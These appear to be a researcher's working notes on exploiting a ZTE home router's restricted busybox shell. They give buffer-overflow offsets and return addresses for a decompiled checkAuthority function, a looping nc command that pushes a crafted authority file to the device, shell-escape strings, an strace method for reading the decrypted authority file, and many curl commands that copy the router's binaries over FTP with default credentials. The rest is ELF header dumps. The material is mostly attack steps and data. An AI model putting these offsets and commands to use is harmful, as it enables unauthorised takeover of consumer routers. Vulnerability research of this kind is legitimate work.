## Exploiting

target is `busybox sh -luser`. `-luser` argument is vendor customized to limit to current user (even is root) to allow limited command based on *authority.txt*.

Buffer Overflow:
```
ls A*6000
```
Using pattern, found offset in `PC` at 1121 ( in write TdTraceLog.txt )

Using 10000 pattern, found break on chek authority call.
PC at: 0x3fe5e830
RA at: 00432d2c (forloop strncat)

Junk len 8864 (ls ..pattern)
offset of RA: 4141

dest stack: 0x407fed5c

``` c
bool checkAuthority(char **param_1,int param_2,int param_3)
{
  size_t sVar1;
  char *pcVar2;
  int iVar3;
  int iVar4;
  bool bVar5;
  undefined1 *cmdCheck;
  int iVar6;
  char **ppcVar7;
  char *__needle;
  char acStack8248 [4100];
  char paramstack [4100];
  char *local_30;
  
  memset(paramstack,0,0x1002);
  memset(acStack8248,0,0x1002);
  strcpy(paramstack,*param_1); // copy first arg (cmd name)
  ppcVar7 = param_1;
  for (iVar6 = 1; ppcVar7 = ppcVar7 + 1, iVar6 < param_2; iVar6 = iVar6 + 1) {
    sVar1 = bb_strlen(" ");
    strncat(paramstack," ",sVar1); // add space
    local_30 = *ppcVar7;
    sVar1 = bb_strlen(local_30);
    strncat(paramstack,local_30,sVar1); // copy arg
  }
  cmdCheck = UserCmd;
  iVar6 = 0;
  do {
    if (DAT_00468f78 <= iVar6) goto LAB_00432e48;
    pcVar2 = strstr(paramstack,cmdCheck);
    if (pcVar2 != NULL) {
      __needle = *param_1;
      pcVar2 = strstr(cmdCheck,__needle);
      if (pcVar2 != NULL) {
        iVar6 = 0;
        if (param_2 < 2) {
          return true;
        }
        while( true ) {
          iVar4 = iVar6 * 0x3284;
          if (DAT_00468f80 <= iVar6) {
            return true;
          }
          iVar3 = strcmp(__needle,g_atTdForbidCmdArray + iVar4 + 4);
          if (iVar3 == 0) break;
          iVar6 = iVar6 + 1;
        }
        iVar6 = 0;
        do {
          bVar5 = *(int *)(g_atTdForbidCmdArray + iVar4) <= iVar6;
          iVar6 = iVar6 + 1;
          if (bVar5) {
            return true;
          }
          pcVar2 = strstr(paramstack,g_atTdForbidCmdArray + iVar6 * 0x80 + iVar4 + 4);
        } while (pcVar2 == NULL);
LAB_00432e48:
        bVar5 = false;
        if (param_3 == 1) {
          FUN_00432ba0(parsefile->buf,acStack8248);
          cmdCheck = OpsCmd;
          for (iVar6 = 0; bVar5 = iVar6 < DAT_00468f7c, bVar5; iVar6 = iVar6 + 1) {
            iVar4 = strcmp(acStack8248,cmdCheck);
            cmdCheck = cmdCheck + 0x80;
            if (iVar4 == 0) {
              return true;
            }
          }
        }
        return bVar5;
      }
    }
    iVar6 = iVar6 + 1;
    cmdCheck = cmdCheck + 0x80;
  } while( true );
}
```

``` sh
# cat <<EOF error, make file manually then cat again
while true; do nc 192.168.1.1 22 < write-authority.txt; done

```

## Telnetd info

``` bash
#exec
/bin/sh -luser
# read n decrypt /etc/authority.txt
# write into /var/tmp/authority_tmp.txt
# delete /var/tmp/authority_tmp.txt
strace -e write=11 chroot . /bin/sh -luser

# copy file
curl -u 'ftp:ftp' -o bin/telnetd ftp://192.168.1.1/bin/telnetd

# telnet force close
$(0)

$(sh)
```

## Telnetd
```
Dynamic section at offset 0x140 contains 26 entries:
  Tag        Type                         Name/Value
 0x00000001 (NEEDED)                     Shared library: [libcommfun.so]
 0x00000001 (NEEDED)                     Shared library: [liboss.so]
 0x00000001 (NEEDED)                     Shared library: [libpthread.so.0]
 0x00000001 (NEEDED)                     Shared library: [libdb.so]
 0x00000001 (NEEDED)                     Shared library: [libdl.so.0]
 0x00000001 (NEEDED)                     Shared library: [libcfapi.so]
 0x00000001 (NEEDED)                     Shared library: [libc.so.0]
 0x0000000f (RPATH)                      Library rpath: [/data/duanyuanyuan/wk_use/wangkai/Builds_/ZXHN_BCM6848-f660v8.0_telkom/csp/release/tools/uclibc/lib]
 0x0000000c (INIT)                       0x401034
 0x0000000d (FINI)                       0x408f70
 0x00000004 (HASH)                       0x400238
 0x00000005 (STRTAB)                     0x400bbc
 0x00000006 (SYMTAB)                     0x40055c
 0x0000000a (STRSZ)                      1144 (bytes)
 0x0000000b (SYMENT)                     16 (bytes)
 0x70000016 (MIPS_RLD_MAP)               0x41d580
 0x00000015 (DEBUG)                      0x0
 0x00000003 (PLTGOT)                     0x41d590
 0x70000001 (MIPS_RLD_VERSION)           1
 0x70000005 (MIPS_FLAGS)                 NOTPOT
 0x70000006 (MIPS_BASE_ADDRESS)          0x400000
 0x7000000a (MIPS_LOCAL_GOTNO)           9
 0x70000011 (MIPS_SYMTABNO)              102
 0x70000012 (MIPS_UNREFEXTNO)            21
 0x70000013 (MIPS_GOTSYM)                0x15
 0x00000000 (NULL)                       0x0
```

```

```

## Busybox
```
busybox:     file format elf32-tradbigmips
busybox
architecture: mips:isa32, flags 0x00000112:
EXEC_P, HAS_SYMS, D_PAGED
start address 0x00444da0

Program Header:
    PHDR off    0x00000034 vaddr 0x00400034 paddr 0x00400034 align 2**2
         filesz 0x00000100 memsz 0x00000100 flags r-x
  INTERP off    0x00000134 vaddr 0x00400134 paddr 0x00400134 align 2**0
         filesz 0x00000014 memsz 0x00000014 flags r--
0x70000000 off    0x00000148 vaddr 0x00400148 paddr 0x00400148 align 2**2
         filesz 0x00000018 memsz 0x00000018 flags r--
    LOAD off    0x00000000 vaddr 0x00400000 paddr 0x00400000 align 2**16
         filesz 0x0005400c memsz 0x0005400c flags r-x
    LOAD off    0x0005400c vaddr 0x0046400c paddr 0x0046400c align 2**16
         filesz 0x00001a98 memsz 0x001687d0 flags rw-
 DYNAMIC off    0x00000160 vaddr 0x00400160 paddr 0x00400160 align 2**2
         filesz 0x00000118 memsz 0x00000118 flags rwx
EH_FRAME off    0x00053fd0 vaddr 0x00453fd0 paddr 0x00453fd0 align 2**2
         filesz 0x00000014 memsz 0x00000014 flags r--
    NULL off    0x00000000 vaddr 0x00000000 paddr 0x00000000 align 2**2
         filesz 0x00000000 memsz 0x00000000 flags ---

Dynamic Section:
  NEEDED               liblog.so
  NEEDED               libcommfun.so
  NEEDED               libmaster.so
  NEEDED               libcfapi.so
  NEEDED               liboss.so
  NEEDED               libpthread.so.0
  NEEDED               libdb.so
  NEEDED               libdl.so.0
  NEEDED               libcsputil.so
  NEEDED               libcrypt.so.0
  NEEDED               libc.so.0
  RPATH                /data/duanyuanyuan/wk_use/wangkai/Builds_/ZXHN_BCM6848-f660v8.0_telkom/csp/release/tools/uclibc/lib
  INIT                 0x00404c60
  FINI                 0x00447eb0
  HASH                 0x00400278
  STRTAB               0x004034ac
  SYMTAB               0x0040130c
  STRSZ                0x000017b2
  SYMENT               0x00000010
  MIPS_RLD_MAP         0x00465250
  DEBUG                0x00000000
  PLTGOT               0x00465260
  MIPS_RLD_VERSION     0x00000001
  MIPS_FLAGS           0x00000002
  MIPS_BASE_ADDRESS    0x00400000
  MIPS_LOCAL_GOTNO     0x000000eb
  MIPS_SYMTABNO        0x0000021a
  MIPS_UNREFEXTNO      0x00000020
  MIPS_GOTSYM          0x000000f4
private flags = 50001007: [abi=O32] [mips32] [not 32bitmode] [noreorder] [PIC] [CPIC]

Sections:
Idx Name          Size      VMA       LMA       File off  Algn
  0 .interp       00000014  00400134  00400134  00000134  2**0
                  CONTENTS, ALLOC, LOAD, READONLY, DATA
  1 .reginfo      00000018  00400148  00400148  00000148  2**2
                  CONTENTS, ALLOC, LOAD, READONLY, DATA, LINK_ONCE_SAME_SIZE
  2 .dynamic      00000118  00400160  00400160  00000160  2**2
                  CONTENTS, ALLOC, LOAD, READONLY, DATA
  3 .hash         00001094  00400278  00400278  00000278  2**2
                  CONTENTS, ALLOC, LOAD, READONLY, DATA
  4 .dynsym       000021a0  0040130c  0040130c  0000130c  2**2
                  CONTENTS, ALLOC, LOAD, READONLY, DATA
  5 .dynstr       000017b2  004034ac  004034ac  000034ac  2**0
                  CONTENTS, ALLOC, LOAD, READONLY, DATA
  6 .init         00000028  00404c60  00404c60  00004c60  2**2
                  CONTENTS, ALLOC, LOAD, READONLY, CODE
  7 .text         000420f0  00404c90  00404c90  00004c90  2**4
                  CONTENTS, ALLOC, LOAD, READONLY, CODE
  8 .MIPS.stubs   00001130  00446d80  00446d80  00046d80  2**2
                  CONTENTS, ALLOC, LOAD, READONLY, CODE
  9 .fini         00000028  00447eb0  00447eb0  00047eb0  2**2
                  CONTENTS, ALLOC, LOAD, READONLY, CODE
 10 .rodata       0000c0f0  00447ee0  00447ee0  00047ee0  2**4
                  CONTENTS, ALLOC, LOAD, READONLY, DATA
 11 .eh_frame_hdr 00000014  00453fd0  00453fd0  00053fd0  2**2
                  CONTENTS, ALLOC, LOAD, READONLY, DATA
 12 .eh_frame     00000028  00453fe4  00453fe4  00053fe4  2**2
                  CONTENTS, ALLOC, LOAD, READONLY, DATA
 13 .data.rel.ro  00000c44  0046400c  0046400c  0005400c  2**2
                  CONTENTS, ALLOC, LOAD, DATA
 14 .data         00000600  00464c50  00464c50  00054c50  2**4
                  CONTENTS, ALLOC, LOAD, DATA
 15 .rld_map      00000004  00465250  00465250  00055250  2**2
                  CONTENTS, ALLOC, LOAD, DATA
 16 .got          00000844  00465260  00465260  00055260  2**4
                  CONTENTS, ALLOC, LOAD, DATA
 17 .sbss         00000054  00465aa8  00465aa8  00055aa4  2**3
                  ALLOC
 18 .bss          00166cdc  00465b00  00465b00  00055aa4  2**4
                  ALLOC
 19 .pdr          000054a0  00000000  00000000  00055aa4  2**2
                  CONTENTS, READONLY
 20 .gnu.attributes 00000010  00000000  00000000  0005af44  2**0
                  CONTENTS, READONLY
 21 .mdebug.abi32 00000000  005cc7dc  005cc7dc  0005af54  2**0
                  CONTENTS, READONLY
SYMBOL TABLE:
no symbols

```

``` bash
# Copying all libs
curl -u 'ftp:ftp' -o ld-uClibc-0.9.32.so ftp://192.168.1.1/lib/ld-uClibc-0.9.32.so
curl -u 'ftp:ftp' -o libcfapi.so ftp://192.168.1.1/lib/libcfapi.so
curl -u 'ftp:ftp' -o libcmapi.so ftp://192.168.1.1/lib/libcmapi.so
curl -u 'ftp:ftp' -o libcmexpat.so ftp://192.168.1.1/lib/libcmexpat.so
curl -u 'ftp:ftp' -o libcommfun.so ftp://192.168.1.1/lib/libcommfun.so
curl -u 'ftp:ftp' -o libcrypt-0.9.32.so ftp://192.168.1.1/lib/libcrypt-0.9.32.so
curl -u 'ftp:ftp' -o libcrypto.so.1.0.0 ftp://192.168.1.1/lib/libcrypto.so.1.0.0
curl -u 'ftp:ftp' -o libcsputil.so ftp://192.168.1.1/lib/libcsputil.so
curl -u 'ftp:ftp' -o libctype.so ftp://192.168.1.1/lib/libctype.so
curl -u 'ftp:ftp' -o libcvc.so ftp://192.168.1.1/lib/libcvc.so
curl -u 'ftp:ftp' -o libdb.so ftp://192.168.1.1/lib/libdb.so
curl -u 'ftp:ftp' -o libdbcspview.so ftp://192.168.1.1/lib/libdbcspview.so
curl -u 'ftp:ftp' -o libdl-0.9.32.so ftp://192.168.1.1/lib/libdl-0.9.32.so
curl -u 'ftp:ftp' -o libenv.so ftp://192.168.1.1/lib/libenv.so
curl -u 'ftp:ftp' -o libgcc_s.so.1 ftp://192.168.1.1/lib/libgcc_s.so.1
curl -u 'ftp:ftp' -o libiprt2.so ftp://192.168.1.1/lib/libiprt2.so
curl -u 'ftp:ftp' -o libkeyuserapi.so ftp://192.168.1.1/lib/libkeyuserapi.so
curl -u 'ftp:ftp' -o libledkey.so ftp://192.168.1.1/lib/libledkey.so
curl -u 'ftp:ftp' -o libleduserapi.so ftp://192.168.1.1/lib/libleduserapi.so
curl -u 'ftp:ftp' -o liblog.so ftp://192.168.1.1/lib/liblog.so
curl -u 'ftp:ftp' -o libm-0.9.32.so ftp://192.168.1.1/lib/libm-0.9.32.so
curl -u 'ftp:ftp' -o libmaster.so ftp://192.168.1.1/lib/libmaster.so
curl -u 'ftp:ftp' -o libmtduserapi.so ftp://192.168.1.1/lib/libmtduserapi.so
curl -u 'ftp:ftp' -o libneon.so ftp://192.168.1.1/lib/libneon.so
curl -u 'ftp:ftp' -o libnsl-0.9.32.so ftp://192.168.1.1/lib/libnsl-0.9.32.so
curl -u 'ftp:ftp' -o libnvram.so ftp://192.168.1.1/lib/libnvram.so
curl -u 'ftp:ftp' -o liboss.so ftp://192.168.1.1/lib/liboss.so
curl -u 'ftp:ftp' -o libpdtcmapi.so ftp://192.168.1.1/lib/libpdtcmapi.so
curl -u 'ftp:ftp' -o libpoweruserapi.so ftp://192.168.1.1/lib/libpoweruserapi.so
curl -u 'ftp:ftp' -o libpthread-0.9.32.so ftp://192.168.1.1/lib/libpthread-0.9.32.so
curl -u 'ftp:ftp' -o librelayuserapi.so ftp://192.168.1.1/lib/librelayuserapi.so
curl -u 'ftp:ftp' -o libresolv-0.9.32.so ftp://192.168.1.1/lib/libresolv-0.9.32.so
curl -u 'ftp:ftp' -o librt-0.9.32.so ftp://192.168.1.1/lib/librt-0.9.32.so
curl -u 'ftp:ftp' -o libsimcarduserapi.so ftp://192.168.1.1/lib/libsimcarduserapi.so
curl -u 'ftp:ftp' -o libssl.so.1.0.0 ftp://192.168.1.1/lib/libssl.so.1.0.0
curl -u 'ftp:ftp' -o libsysinfoapi.so ftp://192.168.1.1/lib/libsysinfoapi.so
curl -u 'ftp:ftp' -o libtagparamuserapi.so ftp://192.168.1.1/lib/libtagparamuserapi.so
curl -u 'ftp:ftp' -o libthread_db-0.9.32.so ftp://192.168.1.1/lib/libthread_db-0.9.32.so
curl -u 'ftp:ftp' -o libuClibc-0.9.32.so ftp://192.168.1.1/lib/libuClibc-0.9.32.so
curl -u 'ftp:ftp' -o libutil-0.9.32.so ftp://192.168.1.1/lib/libutil-0.9.32.so
curl -u 'ftp:ftp' -o libwlbcmcrypto.so ftp://192.168.1.1/lib/libwlbcmcrypto.so
curl -u 'ftp:ftp' -o libwlbcmshared.so ftp://192.168.1.1/lib/libwlbcmshared.so
curl -u 'ftp:ftp' -o libwlctl.so ftp://192.168.1.1/lib/libwlctl.so
curl -u 'ftp:ftp' -o libwlupnp.so ftp://192.168.1.1/lib/libwlupnp.so
curl -u 'ftp:ftp' -o libwps.so ftp://192.168.1.1/lib/libwps.so
curl -u 'ftp:ftp' -o libwwan.so ftp://192.168.1.1/lib/libwwan.so
curl -u 'ftp:ftp' -o rp-pppoe.so ftp://192.168.1.1/lib/rp-pppoe.so

curl -u 'ftp:ftp' -o tdmtool ftp://192.168.1.1/bin/tdmtool
curl -u 'ftp:ftp' -o epondbg ftp://192.168.1.1/bin/epondbg
curl -u 'ftp:ftp' -o iptables ftp://192.168.1.1/bin/iptables
curl -u 'ftp:ftp' -o multicast_test ftp://192.168.1.1/bin/multicast_test
curl -u 'ftp:ftp' -o igmptest ftp://192.168.1.1/bin/igmptest
curl -u 'ftp:ftp' -o gponctl ftp://192.168.1.1/bin/gponctl
curl -u 'ftp:ftp' -o gpondbg ftp://192.168.1.1/bin/gpondbg
curl -u 'ftp:ftp' -o gpontest ftp://192.168.1.1/bin/gpontest
curl -u 'ftp:ftp' -o epontst ftp://192.168.1.1/bin/epontst
curl -u 'ftp:ftp' -o ethdriver_test ftp://192.168.1.1/bin/ethdriver_test
curl -u 'ftp:ftp' -o switchtst ftp://192.168.1.1/bin/switchtst
curl -u 'ftp:ftp' -o opticaltst ftp://192.168.1.1/bin/opticaltst
curl -u 'ftp:ftp' -o date ftp://192.168.1.1/bin/date
curl -u 'ftp:ftp' -o grep ftp://192.168.1.1/bin/grep
curl -u 'ftp:ftp' -o ping ftp://192.168.1.1/bin/ping
curl -u 'ftp:ftp' -o ifconfig ftp://192.168.1.1/bin/ifconfig
curl -u 'ftp:ftp' -o exit ftp://192.168.1.1/bin/exit
curl -u 'ftp:ftp' -o killall ftp://192.168.1.1/bin/killall
curl -u 'ftp:ftp' -o hostapd ftp://192.168.1.1/bin/hostapd
curl -u 'ftp:ftp' -o ethswctl ftp://192.168.1.1/bin/ethswctl
curl -u 'ftp:ftp' -o bdmf_shell ftp://192.168.1.1/bin/bdmf_shell

ln -s ld-uClibc-0.9.32.so ld-linux.so.2
ln -s ld-uClibc-0.9.32.so ld-uClibc.so.0
ln -s libuClibc-0.9.32.so libc.so.0
ln -s libcrypt-0.9.32.so libcrypt.so.0
ln -s libcrypto.so.1.0.0 libcrypto.so
ln -s libdl-0.9.32.so libdl.so.0
ln -s libgcc_s.so.1 libgcc_s.so
ln -s libm-0.9.32.so libm.so.0
ln -s libnsl-0.9.32.so libnsl.so.0
ln -s libpthread-0.9.32.so libpthread.so.0
ln -s libresolv-0.9.32.so libresolv.so.0
ln -s librt-0.9.32.so librt.so.0
ln -s libssl.so.1.0.0 libssl.so
ln -s libthread_db-0.9.32.so libthread_db.so.1
ln -s libutil-0.9.32.so libutil.so.0
```